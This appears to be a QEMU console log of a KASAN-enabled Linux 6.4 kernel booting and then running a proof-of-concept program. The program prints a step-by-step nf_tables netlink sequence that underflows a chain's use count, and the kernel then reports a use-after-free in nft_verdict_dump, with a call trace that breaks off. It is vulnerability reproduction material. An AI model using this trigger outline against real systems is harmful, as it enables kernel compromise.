bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+BEFCEF00+BEF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004bc73a8
input_len: 0x00000000019cff1c
output: 0x0000000001000000
output_len: 0x0000000005521208
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Thu May  7 09:42:04 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000bffdffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bffe0000-0x00000000bfffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000100000000-0x000000013fffffff] usable
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 445641126 cycles
[    0.001341] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.007525] tsc: Detected 2995.198 MHz processor
[    0.010140] last_pfn = 0x140000 max_arch_pfn = 0x400000000
[    0.012051] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.014237] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.015960] last_pfn = 0xbffe0 max_arch_pfn = 0x400000000
[    0.022275] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.024311] Using GB pages for direct mapping
[    0.025550] Incomplete global flushes, disabling PCID
[    0.026303] RAMDISK: [mem 0xbfe5c000-0xbffdffff]
[    0.028769] ACPI: Early table checksum verification disabled
[    0.030475] ACPI: RSDP 0x00000000000F59B0 000014 (v00 BOCHS )
[    0.032765] ACPI: RSDT 0x00000000BFFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.034967] ACPI: FACP 0x00000000BFFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.037141] ACPI: DSDT 0x00000000BFFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039449] ACPI: FACS 0x00000000BFFE0000 000040
[    0.040889] ACPI: APIC 0x00000000BFFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.043109] ACPI: HPET 0x00000000BFFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.045783] ACPI: WAET 0x00000000BFFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.048295] ACPI: Reserving FACP table memory at [mem 0xbffe19df-0xbffe1a52]
[    0.050316] ACPI: Reserving DSDT table memory at [mem 0xbffe0040-0xbffe19de]
[    0.052321] ACPI: Reserving FACS table memory at [mem 0xbffe0000-0xbffe003f]
[    0.054136] ACPI: Reserving APIC table memory at [mem 0xbffe1a53-0xbffe1ad2]
[    0.055844] ACPI: Reserving HPET table memory at [mem 0xbffe1ad3-0xbffe1b0a]
[    0.057714] ACPI: Reserving WAET table memory at [mem 0xbffe1b0b-0xbffe1b32]
[    0.060187] No NUMA configuration found
[    0.061233] Faking a node at [mem 0x0000000000000000-0x000000013fffffff]
[    0.063165] NODE_DATA(0) allocated [mem 0x13fffa000-0x13fffdfff]
[    0.064929] Zone ranges:
[    0.065775]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.066979]   DMA32    [mem 0x0000000001000000-0x00000000ffffffff]
[    0.068599]   Normal   [mem 0x0000000100000000-0x000000013fffffff]
[    0.073697] Movable zone start for each node
[    0.074779] Early memory node ranges
[    0.075748]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.077341]   node   0: [mem 0x0000000000100000-0x00000000bffdffff]
[    0.078992]   node   0: [mem 0x0000000100000000-0x000000013fffffff]
[    0.080630] Initmem setup node 0 [mem 0x0000000000001000-0x000000013fffffff]
[    0.083061] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.083105] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.112781] On node 0, zone Normal: 32 pages in unavailable ranges
[    1.433405] kasan: KernelAddressSanitizer initialized
[    1.439131] ACPI: PM-Timer IO Port: 0x608
[    1.441528] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    1.444686] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    1.447128] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    1.449613] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    1.451825] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    1.454134] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    1.456779] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    1.459266] ACPI: Using ACPI (MADT) for SMP configuration information
[    1.461844] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    1.464659] TSC deadline timer available
[    1.466658] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    1.468930] kvm-guest: KVM setup pv remote TLB flush
[    1.470529] kvm-guest: setup PV sched yield
[    1.471863] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    1.474091] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    1.476283] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    1.479806] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    1.483417] PM: hibernation: Registered nosave memory: [mem 0xbffe0000-0xbfffffff]
[    1.486160] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xfeffbfff]
[    1.488551] PM: hibernation: Registered nosave memory: [mem 0xfeffc000-0xfeffffff]
[    1.490658] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xfffbffff]
[    1.492834] PM: hibernation: Registered nosave memory: [mem 0xfffc0000-0xffffffff]
[    1.495396] [mem 0xc0000000-0xfeffbfff] available for PCI devices
[    1.497170] Booting paravirtualized kernel on KVM
[    1.498636] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    1.523580] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    1.533205] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    1.536784] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    1.541903] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    1.545276] random: crng init done
[    1.561335] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes, linear)
[    1.569946] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    1.574200] Fallback order for Node 0: 0 
[    1.574486] Built 1 zonelists, mobility grouping on.  Total pages: 1031904
[    1.577937] Policy zone: Normal
[    1.578764] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    1.580628] stackdepot: allocating hash table via alloc_large_system_hash
[    1.633124] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    1.636775] software IO TLB: area num 2.
[    2.114953] Memory: 3425600K/4193784K available (49152K kernel code, 7946K rwdata, 10072K rodata, 5644K init, 2948K bss, 767928K reserved, 0K cma-reserved)
[    2.128937] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    2.158616] Dynamic Preempt: voluntary
[    2.169818] rcu: Preemptible hierarchical RCU implementation.
[    2.172096] rcu: 	RCU event tracing is enabled.
[    2.174357] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    2.182087] 	Trampoline variant of Tasks RCU enabled.
[    2.184441] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    2.188454] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    2.302763] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    2.309010] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    2.323726] Console: colour VGA+ 80x25
[    2.326081] printk: console [ttyS0] enabled
[    2.326081] printk: console [ttyS0] enabled
[    2.329524] printk: bootconsole [earlyser0] disabled
[    2.329524] printk: bootconsole [earlyser0] disabled
[    2.336524] ACPI: Core revision 20230331
[    2.340678] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    2.350838] APIC: Switch to symmetric I/O mode setup
[    2.361689] kvm-guest: setup PV IPIs
[    2.371442] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    2.373605] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    2.390575] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    2.397044] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    2.400922] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    2.403549] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    2.405559] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    2.406505] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    2.407485] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    2.409506] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    2.410576] RETBleed: Mitigation: Enhanced IBRS
[    2.411703] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    2.414484] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    2.415510] MMIO Stale Data: Unknown: No mitigations
[    2.416515] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    2.418527] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    2.421498] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    2.422500] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    2.424501] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    2.524874] Freeing SMP alternatives memory: 44K
[    2.526501] pid_max: default: 32768 minimum: 301
[    2.535675] LSM: initializing lsm=capability,selinux,integrity
[    2.536505] SELinux:  Initializing.
[    2.538542] Mount-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    2.539459] Mountpoint-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    2.545610] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    2.551190] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    2.552450] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    2.552693] signal: max sigframe size: 1776
[    2.554703] rcu: Hierarchical SRCU implementation.
[    2.555589] rcu: 	Max phase no-delay instances is 400.
[    2.562679] smp: Bringing up secondary CPUs ...
[    2.572635] smpboot: x86: Booting SMP configuration:
[    2.573531] .... node  #0, CPUs:      #1
[    2.576536] smp: Brought up 1 node, 2 CPUs
[    2.578514] smpboot: Max logical packages: 1
[    2.579888] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    2.595128] devtmpfs: initialized
[    2.612749] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    2.613572] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    2.617484] PM: RTC time: 09:42:51, date: 2026-05-07
[    2.627988] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    2.629319] audit: initializing netlink subsys (disabled)
[    2.634472] audit: type=2000 audit(1778146971.814:1): state=initialized audit_enabled=0 res=1
[    2.660207] thermal_sys: Registered thermal governor 'step_wise'
[    2.660236] thermal_sys: Registered thermal governor 'user_space'
[    2.665467] cpuidle: using governor menu
[    2.683680] PCI: Using configuration type 1 for base access
[    2.692102] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    2.697163] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    2.697460] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    2.699740] ACPI: Added _OSI(Module Device)
[    2.700512] ACPI: Added _OSI(Processor Device)
[    2.701573] ACPI: Added _OSI(3.0 _SCP Extensions)
[    2.702710] ACPI: Added _OSI(Processor Aggregator Device)
[    2.776716] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    2.786199] ACPI: Interpreter enabled
[    2.789450] ACPI: PM: (supports S0 S3 S4 S5)
[    2.789515] ACPI: Using IOAPIC for interrupt routing
[    2.792014] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    2.792540] PCI: Using E820 reservations for host bridge windows
[    2.800359] ACPI: Enabled 2 GPEs in block 00 to 0F
[    2.911274] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    2.911484] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    2.912461] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    2.913569] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    2.915382] PCI host bridge to bus 0000:00
[    2.915473] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    2.916462] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    2.917468] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    2.918462] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff window]
[    2.919463] pci_bus 0000:00: root bus resource [mem 0x140000000-0x1bfffffff window]
[    2.920475] pci_bus 0000:00: root bus resource [bus 00-ff]
[    2.921673] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    2.928798] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    2.936261] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    2.938305] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    2.939237] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    2.939458] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    2.940459] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    2.941457] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    2.942915] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    2.944554] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    2.945483] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    2.947156] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    2.949073] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    2.951559] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    2.956500] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    2.958101] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    2.966322] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    2.967408] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    2.968519] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    2.974486] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    2.984620] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    2.986173] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    2.987048] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    2.988484] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    2.989963] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    2.993270] iommu: Default domain type: Translated 
[    2.993457] iommu: DMA domain TLB invalidation policy: lazy mode 
[    2.995236] SCSI subsystem initialized
[    2.996572] ACPI: bus type USB registered
[    2.997606] usbcore: registered new interface driver usbfs
[    2.998499] usbcore: registered new interface driver hub
[    3.000560] usbcore: registered new device driver usb
[    3.001647] pps_core: LinuxPPS API ver. 1 registered
[    3.002456] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    3.004511] PTP clock support registered
[    3.006809] Advanced Linux Sound Architecture Driver Initialized.
[    3.009862] NetLabel: Initializing
[    3.010459] NetLabel:  domain hash size = 128
[    3.012470] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    3.013919] NetLabel:  unlabeled traffic allowed by default
[    3.015735] PCI: Using ACPI for IRQ routing
[    3.017516] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    3.018450] pci 0000:00:02.0: vgaarb: bridge control possible
[    3.018450] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    3.020487] vgaarb: loaded
[    3.022173] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    3.023459] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    3.029665] clocksource: Switched to clocksource kvm-clock
[    3.031980] VFS: Disk quotas dquot_6.6.0
[    3.033046] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    3.035095] pnp: PnP ACPI init
[    3.037884] pnp: PnP ACPI: found 6 devices
[    3.056306] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    3.059017] NET: Registered PF_INET protocol family
[    3.062471] IP idents hash table entries: 65536 (order: 7, 524288 bytes, linear)
[    3.066950] tcp_listen_portaddr_hash hash table entries: 2048 (order: 3, 32768 bytes, linear)
[    3.069133] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    3.071003] TCP established hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    3.073554] TCP bind hash table entries: 32768 (order: 8, 1048576 bytes, linear)
[    3.076965] TCP: Hash tables configured (established 32768 bind 32768)
[    3.079241] UDP hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    3.081351] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    3.083458] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    3.088928] RPC: Registered named UNIX socket transport module.
[    3.090489] RPC: Registered udp transport module.
[    3.091674] RPC: Registered tcp transport module.
[    3.092903] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    3.095486] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    3.096828] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    3.101074] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    3.105195] pci_bus 0000:00: resource 7 [mem 0xc0000000-0xfebfffff window]
[    3.107128] pci_bus 0000:00: resource 8 [mem 0x140000000-0x1bfffffff window]
[    3.109516] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    3.111101] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    3.113092] PCI: CLS 0 bytes, default 64
[    3.114368] PCI-DMA: Using software bounce buffering for IO (SWIOTLB)
[    3.115264] Unpacking initramfs...
[    3.116257] software IO TLB: mapped [mem 0x00000000bbe5c000-0x00000000bfe5c000] (64MB)
[    3.119868] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    3.122058] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    3.128919] Initialise system trusted keyrings
[    3.130544] workingset: timestamp_bits=56 max_order=20 bucket_order=0
[    3.133487] NFS: Registering the id_resolver key type
[    3.135551] Key type id_resolver registered
[    3.137177] Key type id_legacy registered
[    3.138769] 9p: Installing v9fs 9p2000 file system support
[    3.147974] Key type asymmetric registered
[    3.149182] Asymmetric key parser 'x509' registered
[    3.150668] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    3.151073] Freeing initrd memory: 1552K
[    3.155739] io scheduler mq-deadline registered
[    3.158140] io scheduler kyber registered
[    3.159889] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    3.162147] ACPI: button: Power Button [PWRF]
[    3.164571] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    3.166379] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    3.171614] Non-volatile memory driver v1.3
[    3.172883] Linux agpgart interface v0.103
[    3.174772] ACPI: bus type drm_connector registered
[    3.183879] loop: module loaded
[    3.187977] scsi host0: ata_piix
[    3.190963] scsi host1: ata_piix
[    3.195533] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    3.199293] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    3.202579] e100: Intel(R) PRO/100 Network Driver
[    3.204674] e100: Copyright(c) 1999-2006 Intel Corporation
[    3.208350] e1000: Intel(R) PRO/1000 Network Driver
[    3.209710] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    3.357322] ata2: found unknown device (class 0)
[    3.359395] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    3.362749] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    3.382269] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    3.386310] cdrom: Uniform CD-ROM driver Revision: 3.20
[    3.675240] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    4.036252] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    4.038752] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    4.042013] e1000e: Intel(R) PRO/1000 Network Driver
[    4.043241] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    4.044783] sky2: driver version 1.30
[    4.049145] usbcore: registered new interface driver usblp
[    4.050498] usbcore: registered new interface driver usb-storage
[    4.052204] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    4.057063] serio: i8042 KBD port at 0x60,0x64 irq 1
[    4.058870] serio: i8042 AUX port at 0x60,0x64 irq 12
[    4.062039] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    4.064385] rtc_cmos 00:05: RTC can wake from S4
[    4.067794] rtc_cmos 00:05: registered as rtc0
[    4.069249] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    4.072716] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    4.074908] intel_pstate: CPU model not supported
[    4.076326] hid: raw HID events driver (C) Jiri Kosina
[    4.078424] usbcore: registered new interface driver usbhid
[    4.079835] usbhid: USB HID core driver
[    4.088510] Initializing XFRM netlink socket
[    4.090528] NET: Registered PF_INET6 protocol family
[    4.093306] Segment Routing with IPv6
[    4.094310] In-situ OAM (IOAM) with IPv6
[    4.095335] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    4.097485] NET: Registered PF_PACKET protocol family
[    4.099177] 9pnet: Installing 9P2000 support
[    4.100457] Key type dns_resolver registered
[    4.102321] IPI shorthand broadcast: enabled
[    4.127092] sched_clock: Marking stable (4058223210, 68440342)->(4459898899, -333235347)
[    4.129741] registered taskstats version 1
[    4.130677] Loading compiled-in X.509 certificates
[    4.143892] PM:   Magic number: 10:157:727
[    4.144957] block loop7: hash matches
[    4.145961] printk: console [netcon0] enabled
[    4.147028] netconsole: network logging started
[    4.148550] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    4.152316] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    4.155322] kworker/u4:1 (52) used greatest stack depth: 29408 bytes left
[    4.155669] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    4.158350] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    4.160456] cfg80211: failed to load regulatory.db
[    4.160519] ALSA device list:
[    4.162301]   No soundcards found.
[    4.164391] Freeing unused kernel image (initmem) memory: 5644K
[    4.171642] Write protecting the kernel read-only data: 59392k
[    4.172714] Freeing unused kernel image (rodata/data gap) memory: 168K
[    4.190629] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    4.194831] Run /init as init process
[    4.200368] mount (55) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
[*] batch 1: NEWTABLE t1
[*] batch 2: NEWCHAIN chain4 + NEWCHAIN chain3 (regular victims)
[*] batch 3 (TRIGGER): build chain2(BIND)+chain1(HOOK) + NEWRULE/DELRULE x2 in chain2 + dangling rules in chain1 + NEWRULE/DELRULE rule_1_2
[*] batch 4: DELCHAIN chain3 (use is underflowed -> kernel frees nft_chain)
[*] GETRULE dump (nft_verdict_dump reads freed chain->name)
[    4.431802] ==================================================================
[    4.433759] BUG: KASAN: slab-use-after-free in nft_verdict_dump+0x346/0x350
[    4.435210] Read of size 8 at addr ffff888103cabf58 by task poc/61
[    4.436247] 
[    4.436563] CPU: 1 PID: 61 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    4.437774] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    4.438977] Call Trace:
[    4.439331]  <TASK>
[    4.439674]  dump_stack_lvl+0x36/0x50
[    4.440114]  print_report+0xcf/0x660
[    4.440824]  ? nft_verdict_dump+0x346/0x350
[    4.441718]  kasan_report+0xc7/0x100
[    4.442633]  ? nft_verdict_dump+0x346/0x350
[    4.443582]  nft_verdict_dump+0x346/0x350
[    4.444470]  ? __pfx_nft_verdict_dump+0x10/0x10
[    4.447732]  ? nft_dump_register+0x77/0xa0
[    4.449229]  nft_data_dump+0xbc/0x1e0
[    4.449790]  nf_tables_fill_expr_info+0x1b2/0x320
[    4.450518]  ? nla_put+0x159/0x1c0
[    4.451070]  nft_expr_dump+0xa1/0x1a0
[    4.451623]  ? nla_put+0x159/0x1c0
[    4.452142]  nf_tables_fill_rule_info+0x598/0x8d0
[    4.452845]  ? __pfx_nf_tables_fill_rule_info+0x10/0x10
[    4.453601]  ? __pfx___alloc_pages+0x10/0x10
[    4.454260]  __nf_tables_dump_rules+0x25d/0x660
[    4.454932]  ? __kmalloc_node_track_caller+0xcd/0x160
[    4.455674]  nf_tables_dump_rules+0x4b9/0xba0
[    4.456347]  ? __pfx_nf_tables_dump_rules+0x10/0x10
[    4.456890]  ? __pfx_mutex_lock+0x10/0x10
[    4.457486]  netlink_dump+0x4fe/0x1070
[    4.458135]  ? __pfx_netlink_dump+0x10/0x10
[    4.460863]  ? __kmalloc+0x59/0x160
[    4.461630]  ? mutex_unlock+0x7f/0xd0
[    4.462427]  ? __pfx_mutex_unlock+0x10/0x10
[    4.463414]  ? __kasan_kmalloc+0x8f/0xa0
[    4.464126]  __netlink_dump_start+0x661/0xa40
[    4.465294]  nf_tables_getrule+0x5e8/0x910
[    4.466248]  ? __pfx_nf_tables_getrule+0x10/0x10
[    4.467387]  ? __pfx___nla_validate_parse+0x10/0x10
[    4.468171]  ? __pfx_nf_tables_dump_rules_start+0x10/0x10
[    4.468942]  ? __pfx_nf_tables_dump_rules+0x10/0x10
[    4.469665]  ? __pfx_nf_tables_dump_rules_done+0x10/0x10
[    4.470460]  ? unwind_next_frame+0xc3e/0x2440
[    4.471090]  ? arch_stack_walk+0x74/0x100
[    4.471675]  nfnetlink_rcv_msg+0x456/0x8b0
[    4.472249]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[    4.473039]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    4.473772]  ? kasan_save_stack+0x43/0x60
[    4.474387]  ? kasan_save_stack+0x33/0x60
[    4.475007]  ? kasan_set_track+0x25/0x30
[    4.475651]  ? __kasan_slab_alloc+0x6e/0x70
[    4.476264]  ? kmem_cache_alloc_node+0x110/0x280
[    4.476975]  ? kmalloc_reserve+0x110/0x1e0
[    4.477889]  ? __alloc_skb+0xd4/0x280
[    4.478682]  ? netlink_sendmsg+0x83a/0xc60
